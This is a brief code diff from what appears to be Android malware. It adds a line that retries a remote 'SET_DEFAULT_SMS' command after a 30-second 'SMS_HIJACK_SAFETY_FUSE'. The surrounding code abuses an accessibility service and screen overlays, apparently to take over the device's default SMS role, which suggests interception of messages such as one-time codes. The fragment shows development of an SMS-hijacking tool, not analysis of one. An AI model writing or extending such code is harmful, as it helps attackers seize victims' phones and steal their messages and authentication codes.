@@ -48,6 +48,7 @@ object DefaultSmsManager {
                         expectedMode = ""
                         MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                         DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
+                        CommandRetryManager.scheduleRetry(ctx, pendingCmdId, "SET_DEFAULT_SMS", lastMode, "30s Central Fuse")
                     }
                 }, 30000)
             }
